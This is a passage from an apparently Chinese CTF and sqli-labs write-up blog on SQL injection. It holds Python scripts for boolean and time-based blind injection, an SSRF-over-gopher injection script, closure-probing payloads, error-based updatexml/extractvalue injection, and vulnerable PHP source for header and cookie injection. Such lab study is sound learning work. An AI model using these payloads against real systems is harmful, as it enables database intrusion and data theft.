class="hljs-comment">#flag,mes</span><br><span class="hljs-comment">#flag,mess</span><br><span class="hljs-comment">#flag,messa</span><br><span class="hljs-comment">#flag,messag</span><br><span class="hljs-comment">#flag,message</span><br><span class="hljs-comment">#flag,messages</span><br></code></pre></td></tr></table></figure><p>盲猜flag在flag表里，爆字段名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆字段名</span><br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br></code></pre></td></tr></table></figure><p>已知信息：</p><p>数据库rua、表flag、字段flag，爆flag内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230412103314980.png"></p><p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure><p>当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭</p><p>（感谢LinTu提供的思路）</p><p><img src="/2023/02/09/SQLI/image-20230412130046708.png"></p><p>浏览器发送一次请求，bp抓包。记住python出payload的时候要url编码两次，传到Intruder。</p><p><img src="/2023/02/09/SQLI/image-20230412130722783.png"></p><p><img src="/2023/02/09/SQLI/image-20230412130832052.png"></p><p><img src="/2023/02/09/SQLI/image-20230412130852364.png"></p><p>Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破</p><p><img src="/2023/02/09/SQLI/image-20230412130941926.png"></p><p>异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。</p><hr><h2 id="2023ROIS夏令营"><a href="#2023ROIS夏令营" class="headerlink" title="2023ROIS夏令营"></a>2023ROIS夏令营</h2><h3 id="sqli靶场"><a href="#sqli靶场" class="headerlink" title="sqli靶场"></a>sqli靶场</h3><p>先试单双引号，有报错说明原结构被破坏，则为该引号闭合，都没反应，可能是数字型。再加注释符(–、–+、#都有可能，注意浏览器中从表单提交可能被url编码，可以从hackbar或者bp提交表单)，如果还是报错，则可能存在括号闭合，加括号报错消失之后试下两个语句，<code>or 1=1，or 1=0</code>以及<code>order by ...</code>后者查列数，前者如果结果有所不同则存在布尔注入利用，之后可尝试联合注入、布尔盲注，如果页面始终都没发生变化，则试下时间注入。不存在报错将所有可能情况都试下(<code>&#39; or 1=1/0#</code>、<code>&quot; or 1=1/0#</code>、<code>&quot;) or 1=1/0#</code>、<code>&#39;) or 1=1/0#</code>、<code>&#39;)) or 1=1/0#</code>、<code>&quot;)) or 1=1/0#</code>、)</p><p>常见闭合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 、">&#x27;、 &quot;、&#x27;)、&quot;)、&#x27;))、&quot;))<br></code></pre></td></tr></table></figure><h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>发现不管输入什么页面显示的东西都是一样的，这个时候布尔盲注就不适合我们用。布尔盲注适合页面对于错误和正确结果有不同反应。如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了<code>if()</code>函数和<code>sleep()</code>函数。<code>if(a,sleep(10),1)</code>如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。<br><img src="/2023/02/09/SQLI/image-20230715155500241.png">(%3C和%3E是<code>&lt;&gt;</code>，被编码了hhh)<img src="/2023/02/09/SQLI/image-20230715155607903.png"></p><p>可以看到如果判断长度不为8，刷的一下就加载完了，但是如果数据库名长度等于八就延迟十秒</p><p>后面的操作就类似了</p><p>在利用python编写脚本的时候要利用到time模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:3456/Less-9/&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sqli</span>():<br>    length = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):<br>        start_time = time.time()<br>        payload = <span class="hljs-string">f&quot;&quot;&quot;?id=1&#x27; and if(length(database())=<span class="hljs-subst">&#123;i&#125;</span>,sleep(2),1)--+&quot;&quot;&quot;</span><br>        r = requests.get(url+payload)<br>        end_time = time.time()<br>        exec_time = end_time - start_time<br>        <span class="hljs-keyword">if</span> exec_time&gt;<span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">break</span><br><br>sqli()<br></code></pre></td></tr></table></figure><h4 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h4><p>报错注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql">updatexml(target_xml,xpath_string,new_value)<br>#target_xml:需要更新的xml数据，可以是xml类型的列或变量<br>#xpath_string:xpath表达式，用于指定要更新的节点或属性<br>#new_value:新的值， 用于替换目标节点或属性的值<br>#示例：<br>update your_table set xml_culumn = updatexml(xml_column,&#x27;/root/user[1]/name&#x27;,&#x27;Potatowo&#x27;) where id = 1;<br>#上述示例中your_table是要更新的表，xml_column是包含xml数据的列名,/root/user[1]/name是xpath表达式，指定要更新的节点路径，&#x27;Potatowo&#x27;是设置的新的值<br><br>extractvalue(xml_data,xpath_string)<br>#xml_data：xml数据，可以是xml类型的列或变量<br>#xpath_string:xpath表达式，用于指定要提取的节点<br>#函数根据提供的xpath表达式在xml数据中查找匹配的节点，并返回该节点的文本值<br><br>#一个有效的xpath表达式应该满足以下要求：<br>#以节点测试、函数、运算符或路径表达式开头<br>#路径表达式应以节点轴或节点名称开始<br><br>#若不满足xpath语法，则会报错，如果xpath为sql语句，mysql会执行，并将执行结果返回在报错中<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230716210307686.png"></p><p>测试注入点的时候发现无论如何都没有反应，都只出现上图的情况，当用户名为’admin’或’Dumb’时密码输入什么都行，懵逼了挺久的，然后看了眼这个<img src="/2023/02/09/SQLI/image-20230716210541431.png"></p><p>啊原来是修改密码啊。。。真tm</p><p>既然是修改密码，后端一定存在update语句，修改的是password，猜测传入的password存在引号闭合，随手试了下，</p><p><img src="/2023/02/09/SQLI/image-20230716211039043.png"></p><p>，当然此处的用户名必须是admin或者Dumb，到最后一步查表内容时出问题了</p><p><img src="/2023/02/09/SQLI/image-20230716211543520.png"></p><p>看了眼大佬博客了解到mysql修改和查询不能是同一张表，因此可以引入一个临时表(详情去看<a href="https://potatowo233.github.io/2023/07/09/ROIS-Summer/">另一篇博客</a>)，然后又踩坑(不过还好，报错的意思就是说临时表必须起别名，问题不大</p><p><img src="/2023/02/09/SQLI/image-20230716212625454.png"></p><p>一开始还在纳闷怎么没有admin，观察后发现好像输出字数被限制了，如果想尽可能完整获取数据库中的信息，可以用<code>not in</code>运算符把以及显示出来的用户名排除掉</p><p><img src="/2023/02/09/SQLI/image-20230716213520875.png"></p><p>如下，查出来的满满都是admin（，看来懵逼时瞎尝试的次数不少（</p><p><img src="/2023/02/09/SQLI/image-20230716214135001.png"></p><p>换成updatexml()函数试下，注意新加入的’*****‘参数</p><p><img src="/2023/02/09/SQLI/image-20230716214432222.png"></p><p><strong>想了一下，之前能够回显错误信息的不是都可以用报错注入吗？(脑袋发光)，好像比盲注效率高了不少</strong></p><p>这道题看大佬博客好像都审计了一眼源代码，于是跟着学习了下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_input</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>))<br>&#123;<br><span class="hljs-comment">// truncation (see comments)</span><br><span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>);<br>&#125;<br><br><span class="hljs-comment">// Stripslashes if magic quotes enabled</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())<br>&#123;<br><span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><br><span class="hljs-comment">// Quote if not a number</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_digit</span>(<span class="hljs-variable">$value</span>))<br>&#123;<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;&#x27;&quot;</span> . <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())<br>&#123;<br><span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中<code>get_magic_quotes_gpc()</code>函数的作用是判断<code>get_magic_quotes_gpc()</code>是否开启，如果开启的话会给用户传入的信息添加上转义字符’\‘，，<code>stringslashes()</code>则是去掉转义字符，这个方法在新版本的php中已经被废弃了，也盲学一下，增长见识。</p><h4 id="HTTP头注入："><a href="#HTTP头注入：" class="headerlink" title="HTTP头注入："></a>HTTP头注入：</h4><p>看一眼源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result1</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row1</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result1</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row1</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;<br><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$insert</span>);<br><span class="hljs-comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br><span class="hljs-comment">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your User Agent is: &#x27;</span> .<span class="hljs-variable">$uagent</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;<br><span class="hljs-comment">//echo &quot;Try again looser&quot;;</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>一开始的页面，随便输一个显示本机IP，从源代码可以看出得先登陆成功才会显示uagent，就试admin，源代码不含闭合，是数字型的，试了下<code>admin or 1=1--+</code>不行，试密码吧，试来试去最后居然还是最后忘记填密码了登陆成功的。。。密码为空。。。<img src="/2023/02/09/SQLI/image-20230717133037707.png"></p><p>成功显示出uagent，看到代码这一行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;<br></code></pre></td></tr></table></figure><p>和上一题一样，uagent单引号闭合，没有查询语句，可以试试报错注入，因为IP变量不可控(不可按预期方法控制)，uname这里不是admin就没法登录也就没法显示uagent，指向很明确了，user agent就是注入点，单引号闭合，</p><p><img src="/2023/02/09/SQLI/image-20230717133503945.png"></p><p>成功报错，注意到原来语句的VALUE存在左括号，因此注入时要额外增加一个右括号保证语句的完整。</p><p><img src="/2023/02/09/SQLI/image-20230717133920520.png"></p><p>或者加<code>and &#39;</code><img src="/2023/02/09/SQLI/image-20230717134050816.png"></p><p>确实没密码。。。</p><p><img src="/2023/02/09/SQLI/image-20230717134452778.png"></p><p>level19和level18差不多，只是注入点从uagent变成了referer</p><p><img src="/2023/02/09/SQLI/image-20230717140539335.png"></p><h4 id="level20"><a href="#level20" class="headerlink" title="level20:"></a>level20:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Issue with your mysql: &#x27;</span> . <span class="hljs-title function_ invoke__">mysql_error</span>());<br>&#125;<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your ID:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  &#125;<br></code></pre></td></tr></table></figure><p>单引号闭合username&#x3D;cookie，因此只需要对cookie进行闭合后注入恶意语句即可</p><p><img src="/2023/02/09/SQLI/image-20230717144828460.png"></p><h4 id="level21"><a href="#level21" class="headerlink" title="level21:"></a>level21:</h4><p>和上一题基本没差，就是在cookie上多了个base64编码过程，然后查询语句闭合方式变为<code>&#39;)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cookee</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cookee</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Issue with your mysql: &#x27;</span> . <span class="hljs-title function_ invoke__">mysql_error</span>());<br>&#125;<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your ID:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  